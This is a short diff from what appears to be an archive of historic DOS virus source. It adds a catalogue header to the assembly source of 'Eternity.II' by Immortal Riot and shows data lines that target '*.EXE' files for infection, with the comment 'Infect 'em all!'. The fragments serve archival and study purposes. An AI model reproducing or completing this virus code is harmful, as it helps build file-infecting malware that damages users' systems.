@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      E
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ;		         -Eternity.II-
 ;      "Created by Immortal Riot's destructive development team"
 ;              (c) '94 The Unforgiven/Immortal Riot 
@@ -263,7 +274,7 @@ retf
 groupdb db "(c) '94 The Unforgiven/Immortal Riot" ; That's moi..
 
 dot_dot		db	'..',0		    ; Another directory
-file_match	db	'*.EXE',0	    ; Infect �m all!
+file_match	db	'*.EXE',0	    ; Infect �m all!
 
 Exe_header	db	16 DUP(0)
 		dw	0fff0	
